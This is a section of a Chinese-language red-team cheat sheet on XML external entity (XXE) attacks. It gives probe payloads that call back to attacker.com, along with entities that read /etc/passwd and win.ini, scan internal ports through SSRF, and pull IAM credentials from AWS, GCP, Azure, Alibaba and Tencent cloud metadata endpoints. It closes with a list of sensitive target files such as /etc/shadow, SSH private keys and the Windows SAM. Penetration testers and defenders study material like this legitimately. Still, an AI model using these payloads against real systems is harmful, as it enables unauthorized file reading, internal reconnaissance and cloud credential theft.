## 二、基础检测与有回显利用

### 2.1 最小检测 Payload（先探实体处理，再探外部实体）
```xml
<!-- 探针1：内部实体（区分"是否处理实体"）-->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY test "XXE_OK"> ]>
<root>&test;</root>
<!-- 响应含 XXE_OK → 实体被处理，继续外部实体测试 -->

<!-- 探针2：外部实体回连（DNS/HTTP 外带，最安全）-->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe_probe">
]>
<root>&xxe;</root>

<!-- 探针3：参数实体回连（绕过部分输入校验）-->
<!DOCTYPE foo [ <!ENTITY % p SYSTEM "http://attacker.com/p_probe"> %p; ]>
<root/>
```
**判定标准**：攻击者服务器收到 DNS/HTTP 请求 → XXE 确认存在。若响应直接回显实体值 → 有回显 XXE，走第二章；否则 → Blind XXE，走第三章。

### 2.2 文件读取（有回显）
```xml
<!-- Linux -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Windows（注意 file:///c:/ 三斜杠写法）-->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>

<!-- 读不了含 < 的文件时：先读 /etc/hostname 等纯文本确认，再上 CDATA（见3.3）-->
```

### 2.3 SSRF 与内网端口探测
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root>&xxe;</root>

<!-- 探测内网常见端口：80/8080/443/3306/6379/9200/2375... -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.10:6379/">
]>
<root>&xxe;</root>
<!-- 通过响应差异（内容/超时/错误信息）判断端口开放 -->
```

### 2.4 云元数据窃取
```xml
<!-- AWS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!-- GCP（需 Metadata-Flavor: Google 头，纯 XXE 部分场景不可行，可尝试 gopher/dict 注入头）-->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
<!-- Azure（需 Metadata: true 头）-->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
<!-- 阿里云 -->
<!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/ram/security-credentials/">
<!-- 腾讯云 -->
<!ENTITY xxe SYSTEM "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/">
```

### 2.5 高价值目标文件清单（红队记忆）
```
Linux: /etc/passwd /etc/shadow /etc/hosts /etc/hostname /etc/resolv.conf
       /etc/ssh/sshd_config /root/.ssh/id_rsa /home/*/.ssh/authorized_keys
       /proc/self/environ /proc/self/cmdline /proc/self/fd/*（文件描述符！）
       /var/www/html/config.php /etc/nginx/nginx.conf /etc/apache2/apache2.conf
       /opt/app/application.properties /app/.env /var/lib/mysql/...
Windows: C:\Windows\win.ini C:\Windows\System32\drivers\etc\hosts
        C:\Windows\System32\config\SAM（权限受限）C:\inetpub\wwwroot\web.config
        C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\...（凭据）
        C:\Program Files\... 应用配置文件
```

